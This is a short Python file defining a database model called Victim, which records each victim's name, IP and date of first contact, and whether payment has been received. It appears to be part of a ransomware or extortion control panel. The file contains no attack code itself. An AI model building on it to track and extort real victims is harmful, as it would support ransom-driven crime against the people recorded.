from app import db
from datetime import datetime


def load_victim(victim_id):
    return Victim.query.get(int(victim_id))


class Victim(db.Model):
    victim_id = db.Column(db.Integer, primary_key=True)
    victim_name = db.Column(db.Text, nullable=False)
    date_firstContact = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
    ip_firstContact = db.Column(db.Text, nullable=False)
    payment_received = db.Column(db.Boolean, default=0)
    archived = db.Column(db.Boolean, default=0)

    def __repr__(self):
        return f"Victim('{self.victim_id}', '{self.victim_name}', '{self.ip_firstContact}', '{self.date_firstContact}')"
